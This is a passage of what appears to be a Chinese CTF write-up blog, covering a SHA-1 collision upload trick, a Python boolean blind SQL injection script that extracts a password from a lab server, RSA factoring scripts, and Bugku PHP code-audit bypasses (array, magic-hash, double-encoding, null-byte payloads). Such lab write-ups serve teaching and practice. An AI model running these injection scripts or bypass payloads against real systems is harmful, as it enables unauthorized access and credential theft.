class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Height<span class="hljs-symbol">%203</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Type<span class="hljs-symbol">%204</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Subtype<span class="hljs-symbol">%205</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Filter<span class="hljs-symbol">%206</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/ColorSpace<span class="hljs-symbol">%207</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/Length<span class="hljs-symbol">%208</span><span class="hljs-symbol">%200</span><span class="hljs-symbol">%20</span>R/BitsPerComponent<span class="hljs-symbol">%208</span><span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%3</span>E<span class="hljs-symbol">%0</span>Astream<span class="hljs-symbol">%0</span>A<span class="hljs-symbol">%FF</span><span class="hljs-symbol">%D8</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%24</span>SHA<span class="hljs-number">-1</span><span class="hljs-symbol">%20</span>is<span class="hljs-symbol">%20</span>dead<span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%85</span>/<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%239</span>u<span class="hljs-symbol">%9</span>C<span class="hljs-number">9</span><span class="hljs-symbol">%B1</span><span class="hljs-symbol">%A1</span><span class="hljs-symbol">%C6</span><span class="hljs-symbol">%3</span>CL<span class="hljs-symbol">%97</span><span class="hljs-symbol">%E1</span><span class="hljs-symbol">%FF</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%01</span>sF<span class="hljs-symbol">%DC</span><span class="hljs-symbol">%91</span>f<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%7</span>E<span class="hljs-symbol">%11</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%02</span><span class="hljs-symbol">%9</span>A<span class="hljs-symbol">%B6</span><span class="hljs-symbol">%21</span><span class="hljs-symbol">%B2V</span><span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%F9</span><span class="hljs-symbol">%CAg</span><span class="hljs-symbol">%CC</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%C7</span><span class="hljs-symbol">%F8</span><span class="hljs-symbol">%5</span>B<span class="hljs-symbol">%A8Ly</span><span class="hljs-symbol">%03</span><span class="hljs-symbol">%0</span>C<span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%3</span>D<span class="hljs-symbol">%E2</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%F8m</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%A9</span><span class="hljs-symbol">%09</span><span class="hljs-symbol">%01</span><span class="hljs-symbol">%D5</span><span class="hljs-symbol">%DFE</span><span class="hljs-symbol">%C1O</span><span class="hljs-symbol">%26</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%DF</span><span class="hljs-symbol">%B3</span><span class="hljs-symbol">%DC8</span><span class="hljs-symbol">%E9j</span><span class="hljs-symbol">%C2</span>/<span class="hljs-symbol">%E7</span><span class="hljs-symbol">%BDr</span><span class="hljs-symbol">%8</span>F<span class="hljs-symbol">%0</span>EE<span class="hljs-symbol">%BC</span><span class="hljs-symbol">%E0F</span><span class="hljs-symbol">%D2</span><span class="hljs-symbol">%3</span>CW<span class="hljs-symbol">%0</span>F<span class="hljs-symbol">%EB</span><span class="hljs-symbol">%14</span><span class="hljs-symbol">%13</span><span class="hljs-symbol">%98</span><span class="hljs-symbol">%BBU.</span><span class="hljs-symbol">%F5</span><span class="hljs-symbol">%A0</span><span class="hljs-symbol">%A8</span><span class="hljs-symbol">%2</span>B<span class="hljs-symbol">%E31</span><span class="hljs-symbol">%FE</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%807</span><span class="hljs-symbol">%B8</span><span class="hljs-symbol">%B5</span><span class="hljs-symbol">%D7</span><span class="hljs-symbol">%1</span>F<span class="hljs-symbol">%0</span>E<span class="hljs-number">3</span>.<span class="hljs-symbol">%DF</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%AC5</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%EBM</span><span class="hljs-symbol">%DC</span><span class="hljs-symbol">%0</span>D<span class="hljs-symbol">%EC</span><span class="hljs-symbol">%C1</span><span class="hljs-symbol">%A8dy</span><span class="hljs-symbol">%0</span>Cx<span class="hljs-symbol">%2</span>Cv<span class="hljs-symbol">%21</span>V<span class="hljs-symbol">%60</span><span class="hljs-symbol">%DD0</span><span class="hljs-symbol">%97</span><span class="hljs-symbol">%91</span><span class="hljs-symbol">%D0k</span><span class="hljs-symbol">%D0</span><span class="hljs-symbol">%AF</span><span class="hljs-symbol">%3</span>F<span class="hljs-symbol">%98</span><span class="hljs-symbol">%CD</span><span class="hljs-symbol">%A4</span><span class="hljs-symbol">%BCF</span><span class="hljs-symbol">%29</span><span class="hljs-symbol">%B1</span></code></pre></div>

<p><strong>还有一个很坑的地方，hackbar上传时没有作用，只能用bp抓包上传，抓包时注意先随便post一个参数，这样数据包才是post方式，然后贴上上面的两个参数值</strong></p>
<h3 id="babysql2"><a href="#babysql2" class="headerlink" title="babysql2"></a>babysql2</h3><p>查询语句与第一个注入相同，但是这题不给回显，猜测是盲注，但是好像过滤了更多的关键字</p>
<p>在1的基础上额外过滤了 ‘ ， ascii ， mid ， substr ，关闭了报错回显和输出，但是查询成功或者失败 回显不同，因此可以bool注入。</p>
<div class="hljs"><pre><code class="hljs python">url = <span class="hljs-string">'http://219.219.61.234:20004/'</span>
password = <span class="hljs-string">""</span>
string = [ord(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz!_@-&#125;&#123;'</span>]<span class="hljs-comment">#将字母转换为ascii码</span>
a = <span class="hljs-string">'0x5e'</span>   <span class="hljs-comment"># '\'的ascii码值</span>
<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
        <span class="hljs-keyword">if</span> (hex(j)[<span class="hljs-number">2</span>:]==<span class="hljs-string">'7b'</span>):
            str=<span class="hljs-string">'5c'</span>+hex(j)[<span class="hljs-number">2</span>:]  <span class="hljs-comment">#将'&#123;'转义，</span>
        <span class="hljs-keyword">else</span>:
            str=hex(j)[<span class="hljs-number">2</span>:]

        time.sleep(<span class="hljs-number">0.1</span>)

        payload  =<span class="hljs-string">"||/**/(select/**/password/**/from/**/users/**/limit/**/9,1)/**/regexp/**/binary/**/%s/**/#"</span> % (a + str)
<span class="hljs-comment"># 盲注的查询语句 regexp binary 是区分大小写的正则匹配</span>
        data =&#123;<span class="hljs-string">"username"</span>:<span class="hljs-string">"\\"</span>,<span class="hljs-string">"password"</span>:payload&#125;
        print(data)
        r = requests.post(url,data=data) <span class="hljs-comment">#访问</span>
        <span class="hljs-keyword">if</span> <span class="hljs-string">"success"</span> <span class="hljs-keyword">in</span> r.text:
            <span class="hljs-comment">#print(r.text)</span>
            password+=chr(j)
            print(password)
            a+=str      		
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">if</span> <span class="hljs-string">"wrong"</span> <span class="hljs-keyword">in</span> r.text:
        <span class="hljs-keyword">break</span>
print(password)</code></pre></div>

<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>先转换为十进制后在线分解后直接上脚本</p>
<p><a href="http://www.factordb.com/" target="_blank" rel="noopener">http://www.factordb.com/</a> 在线分解网址</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> sys
sys.setrecursionlimit(<span class="hljs-number">1000000</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ByteToHex</span><span class="hljs-params">(bins)</span>:</span>
  <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">"%02X"</span> % x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> bins]).strip()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span><span class="hljs-params">(a, b)</span>:</span>
  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:
    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)
  <span class="hljs-keyword">else</span>:
    g, y, x = egcd(b % a, a)
    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modinv</span><span class="hljs-params">(a, m)</span>:</span>
  g, x, y = egcd(a, m)
  <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:
    print(<span class="hljs-string">'modular inverse does not exist'</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">'null'</span>
  <span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">return</span> x % m
c = <span class="hljs-number">40448992051548719008529549070468060415257485938698092782029814901918646701101</span>
p = <span class="hljs-number">328413456989577256301798468872388310877</span>
q = <span class="hljs-number">324350545929838254331191385863847627003</span>
e = <span class="hljs-number">65537</span>
n = p * q
d = modinv(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))
m = pow(c, d, n)

<span class="hljs-keyword">print</span> (m)</code></pre></div>



<p>数字转字符的脚本</p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">n2s</span><span class="hljs-params">(num)</span>:</span>
  t = hex(num)[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]  <span class="hljs-comment"># python</span>
  <span class="hljs-keyword">if</span> len(t) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:
    t = <span class="hljs-string">'0'</span> + t
  \<span class="hljs-comment">#print(t)</span>
  <span class="hljs-keyword">return</span>(binascii.a2b_hex(t).decode(<span class="hljs-string">'latin1'</span>))
print(n2s(a)) <span class="hljs-comment">#a为上一个脚本计算出的数字</span></code></pre></div>



<h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><h3 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h3><p>次题与幼儿园的类似，但是由于n过大，试了很多工具都无法分解。</p>
<p>仔细看题会发现这题的条件给的比较多,知道p-q</p>
<p>于是想到了<code>(p+q)^2-(p-q)^2=4pq=4n</code>，可以算出p+q,之后解出p,q</p>
<div class="hljs"><pre><code class="hljs python">算p,q的脚本
<span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/9/24 21:55</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : su.py</span>
<span class="hljs-keyword">import</span> gmpy2
n = <span class="hljs-number">848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397</span>
p_sub_q = <span class="hljs-number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span>
x = (<span class="hljs-number">4</span>*n+p_sub_q*p_sub_q)

gmpy2.mpz(x)
<span class="hljs-comment">#p_add_q = gmpy2.iroot(x, 2)</span>
p_add_q = <span class="hljs-number">58342634998122692674032973234620896020471694068399847453520741898744437026570834277134765347908181270295928479896424327076716339778780713227054670754114006755614107059128760453507315091935855120450792252194791430498450216725579392051311373554303029775579999984765816108626868293630358812164765119470747267373609041885833415440716244492402495944064255436477147868576748300862501670473856373437423326957856588782039066794320093570665076624361151742737113922376038763268964187459938086360191752544167623804772397201519904950840301831333585995087985697059748872751988663760065650743406672809203915981347563824970092886078</span>
<span class="hljs-comment"># print(p_add_q)</span>
y=(p_sub_q+p_add_q)
z=(p_add_q-p_sub_q)

print(y&gt;&gt;<span class="hljs-number">1</span>)
print(z&gt;&gt;<span class="hljs-number">1</span>)</code></pre></div>

<p>知道p,q后，此题的解法与幼儿园的解法相同</p>
<p>菜鸡只会这么多。。。</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>文件包含</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku代码审计</title>
    <url>/2020/09/14/decode/</url>
    <content><![CDATA[<h1 id="简单的代码审计"><a href="#简单的代码审计" class="headerlink" title="简单的代码审计"></a>简单的代码审计</h1><a id="more"></a>

<h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag=<span class="hljs-string">'xxx'</span>;  <span class="hljs-comment">//新建变量</span>
extract($_GET);  <span class="hljs-comment">// 变量覆盖</span>
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($shiyan))   <span class="hljs-comment">//判断是否存在</span>
&#123;
$content=trim(file_get_contents($flag));<span class="hljs-comment">//把文件读入字符串</span>
<span class="hljs-keyword">if</span>($shiyan==$content)  <span class="hljs-comment">//判断两变量是否相等</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'flag&#123;xxx&#125;'</span>;
&#125;
<span class="hljs-keyword">else</span>
&#123;
<span class="hljs-keyword">echo</span><span class="hljs-string">'Oh.no'</span>;
&#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>extract()函数</p>
<p><img src="https://i.loli.net/2020/11/28/z6p1eRwBdhAiJFK.png" srcset="/img/loading.gif" alt="extrct.png"></p>
<p><strong>isset()函数</strong><br>isset() 函数用于检测变量是否已设置并且非 NULL。</p>
<p>如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。</p>
<p>若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。</p>
<p>同时要注意的是 null 字符（”\0”）并不等同于 PHP 的 NULL 常量。</p>
<p>Tips:isset()函数如果一次传入多个参数，只有参数全被设置且非空的情况下才返回TRUE，isset()函数对数组中的元素同样适用。</p>
<p>file_get_contents() </p>
<p><img src="https://i.loli.net/2020/11/28/2TUeHbzKjo3v9WL.png" srcset="/img/loading.gif" alt="file.png"></p>
<p>变量覆盖的意思就是让自己上传的变量值覆盖原有的变量值</p>
<p>这里值得注意的是 <code>$shiyan</code>==<code>$content</code>,而content的值来自于函数自己建的$flag变量，所以这题目的变量覆盖实际是覆盖$flag的值，让flag的值和shiyan的值相同</p>
<p>可以用空值的方法使二者想等即</p>
<p><code>?shiyan=&amp;flag=</code></p>
<h2 id="strcmp比较字符串"><a href="#strcmp比较字符串" class="headerlink" title="strcmp比较字符串"></a>strcmp比较字符串</h2><p><a href="http://123.206.87.240:9009/6.php" target="_blank" rel="noopener">http://123.206.87.240:9009/6.php</a></p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag&#123;xxxxx&#125;"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>])) &#123;
<span class="hljs-keyword">if</span> (strcmp($_GET[<span class="hljs-string">'a'</span>], $flag) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span>
<span class="hljs-comment">//比较两个字符串（区分大小写）</span>
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'No'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>题目给的注释很清楚的给出了获得flag的条件。。。</p>
<p>先了解一下</p>
<p><img src="https://i.loli.net/2020/11/28/HzFDTPCwtU1rkf2.png" srcset="/img/loading.gif" alt="strcmp.png"></p>
<p>strcmp()的两个参数都必须是字符串类型的，但是如果传递一个非字符穿类型的参数进去，例如数组，则函数就会报错，其返回值就为0。满足 <code>if (strcmp($_GET[&#39;a&#39;], $flag) == 0)</code>  即可获得flag</p>
<p><strong>url:<code>http://123.206.87.240:9009/6.php?a[]=</code></strong></p>
<h2 id="urldecode二次编码绕过"><a href="#urldecode二次编码绕过" class="headerlink" title="urldecode二次编码绕过"></a>urldecode二次编码绕过</h2><p>题目说的很清楚了，二次编码绕过</p>
<div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(eregi(<span class="hljs-string">"hackerDJ"</span>,<span class="hljs-variable">$_GET</span>[id])) &#123;
<span class="hljs-built_in">echo</span>(<span class="hljs-string">"</span>
<span class="hljs-string"></span>
<span class="hljs-string">not allowed!</span>
<span class="hljs-string"></span>
<span class="hljs-string">"</span>);</code></pre></div>



<blockquote>
<p>PHP 函数 eregi()</p>
<p>语法<br> int eregi(string pattern, string string, [array regs]);<br> 定义和用法<br> eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。Eregi()可以特别有用的检查有效性字符串,如密码。</p>
<p>可选的输入参数规则包含一个数组的所有匹配表达式,他们被正则表达式的括号分组。</p>
<p>返回值<br> 如果匹配成功返回true,否则,则返回false</p>
</blockquote>
<p>这里进行了过滤，传的值不能为hackerDJ</p>
<div class="hljs"><pre><code class="hljs php">
$_GET[id] = urldecode($_GET[id]);
<span class="hljs-keyword">if</span>($_GET[id] == <span class="hljs-string">"hackerDJ"</span>) <span class="hljs-comment">//要编码的字符串hackerDJ</span></code></pre></div>

<p>GET会提交时进行一次urlencode</p>
<p>urldecode()于urlencode()是一对想反作用的函数，一个解码一个编码。</p>
<p><code>$_GET[id] = urldecode($_GET[id])</code>     urldecode后的<strong>$_GET[id]</strong> 复制给自己等于hackerDJ</p>
<p>所以对hackerDJ 进行两次urlencode, 为了绕过过滤；进行一次urldecode后其值和hackerDJ相等，得到flag</p>
<p><code>?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></p>
<h2 id="md5-函数"><a href="#md5-函数" class="headerlink" title="md5()函数"></a>md5()函数</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);
$flag = <span class="hljs-string">'flag&#123;test&#125;'</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'username'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>])) &#123;
<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'username'</span>] == $_GET[<span class="hljs-string">'password'</span>])
<span class="hljs-keyword">print</span> <span class="hljs-string">'Your password can not be your username.'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'username'</span>]) === md5($_GET[<span class="hljs-string">'password'</span>]))
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>利用md5不能处理数组的特性绕过</p>
<p><a href="https://www.w3school.com.cn/php/func_string_md5.asp" target="_blank" rel="noopener">md5()</a></p>
<p>md5函数遇到数组类型的参数时，返回值为null，null===null,所以满足<code>md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]</code></p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
/?username[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>



<h2 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> ($_GET[<span class="hljs-string">'password'</span>])) &#123;
<span class="hljs-keyword">if</span> (ereg (<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>, $_GET[<span class="hljs-string">'password'</span>]) === <span class="hljs-keyword">FALSE</span>) <span class="hljs-comment">//进行过滤，password必须包含字母和数字</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'You password must be alphanumeric'</span>;
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (strpos ($_GET[<span class="hljs-string">'password'</span>], <span class="hljs-string">'--'</span>) !== <span class="hljs-keyword">FALSE</span>)
<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span> . $flag);
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password'</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>提示是数组返回NULL</p>
<p>直接尝试提交<code>?password[]=</code>，flag就出来了</p>
<p>了解一下原理，</p>
<blockquote>
<p>代码相关知识点链接如下：</p>
<p>isset函数：<a href="http://php.net/manual/zh/function.isset.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.isset.php</a></p>
<p>ereg函数：<a href="http://www.php.net/manual/zh/function.ereg.php" target="_blank" rel="noopener">http://www.php.net/manual/zh/function.ereg.php</a></p>
<p>strpos函数：<a href="http://www.w3school.com.cn/php/func_string_strpos.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_strpos.asp</a></p>
<p>“[A-Za-z0-9]”<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符</p>
<p>“^[A-Za-z0-9]$”<br>^表示字符串开始，$表示字符串结束 ，这个匹配只有一个大小写字母和数字字符的字符串</p>
<p>“^[A-Za-z0-9]+$”<br>+号表示重复1到多次，匹配由多个数字大小字母组成的字符串</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/28/2EjrzqhlvA4pcRg.png" srcset="/img/loading.gif" alt="ereg.png"></p>
<p><img src="https://i.loli.net/2020/11/28/yMSHUw8EcGd9izo.png" srcset="/img/loading.gif" alt="strpos.png"></p>
<p>值得注意的是这两个函数能处理的参数都是string类型</p>
<div class="hljs"><pre><code class="hljs php">ereg只能处理字符，r如果数组，则返回的是<span class="hljs-keyword">null</span>，三个等号的时候不会进行类型转换。所以<span class="hljs-keyword">null</span>不等于<span class="hljs-keyword">false</span>。

strpos的参数同样不能够是数组，所以返回的依旧是<span class="hljs-keyword">null</span>，<span class="hljs-keyword">null</span>不等于<span class="hljs-keyword">false</span>也是正确。</code></pre></div>

<p>故?password[]=可以绕过。</p>
<p>但是还有一种为%00截断</p>
<p><code>?password=d%00--</code></p>
<h2 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h2><div class="hljs"><pre><code class="hljs php">$temp = $_GET[<span class="hljs-string">'password'</span>];
is_numeric($temp)?<span class="hljs-keyword">die</span>(<span class="hljs-string">"no numeric"</span>):<span class="hljs-keyword">NULL</span>;
<span class="hljs-keyword">if</span>($temp&gt;<span class="hljs-number">1336</span>)&#123;
<span class="hljs-keyword">echo</span> $flag;</code></pre></div>

<p>题目说了弱类型比较绕过</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">1444</span>b</code></pre></div>

<p>首先在is_numeric()检查时，因为1444b中包含了字母b所以不会认为是数字类型</p>
<p>在判断是否大于1336时，php默认1444b是数字类型，所以大于1336</p>
<h2 id="sha-函数比较绕过"><a href="#sha-函数比较绕过" class="headerlink" title="sha()函数比较绕过"></a>sha()函数比较绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$flag = <span class="hljs-string">"flag"</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'name'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'password'</span>]))
&#123;
   var_dump($_GET[<span class="hljs-string">'name'</span>]);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">""</span>;
   var_dump($_GET[<span class="hljs-string">'password'</span>]);
   var_dump(sha1($_GET[<span class="hljs-string">'name'</span>]));
   var_dump(sha1($_GET[<span class="hljs-string">'password'</span>]));
    
   <span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'name'</span>] == $_GET[<span class="hljs-string">'password'</span>])
		<span class="hljs-keyword">echo</span> <span class="hljs-string">'Your password can not be your name!'</span>;
   <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (sha1($_GET[<span class="hljs-string">'name'</span>]) === sha1($_GET[<span class="hljs-string">'password'</span>]))
	    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);
   <span class="hljs-keyword">else</span>
	    <span class="hljs-keyword">echo</span> <span class="hljs-string">'Invalid password.'</span>;
&#125;
<span class="hljs-keyword">else</span>
<span class="hljs-keyword">echo</span> <span class="hljs-string">'Login first!'</span>;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>代码逻辑很简单，首先判断是否get方式传递name和password参数</p>
<p>var_dump，输出参数类型和值</p>
<p>之后如果通过if判断则可以拿到flag</p>
<p>if判断的条件</p>
<blockquote>
<p>name和password不能相同</p>
<p>但是sha1(name)===sha1(password)</p>
</blockquote>
<p>这里可以使用sha1函数无法处理数组的漏洞绕过，sha1遇到参数为数组类型时返回值为0</p>
<p>payload：</p>
<div class="hljs"><pre><code class="hljs angelscript">GET:
?name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre></div>



<h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"flag&#123;*&#125;"</span>;
&#125; 
<span class="hljs-keyword">else</span> &#123;
	<span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;
&#125;
<span class="hljs-keyword">else</span>
&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>即使用get方式传递一个参数a,使得a的值不等于<code>QNKCDZO</code>但是二者的md5值相同</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>常见的payload有</p>
<div class="hljs"><pre><code class="hljs stylus">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a


<span class="hljs-comment">//下面是sha1()加密后 ==相等的字符串</span>
 sha1(str)
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaroZmOk'</span>)</span></span>  
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaK1STfY'</span>)</span></span>
<span class="hljs-function"><span class="hljs-title">sha1</span><span class="hljs-params">(<span class="hljs-string">'aaO8zKZF'</span>)</span></span>
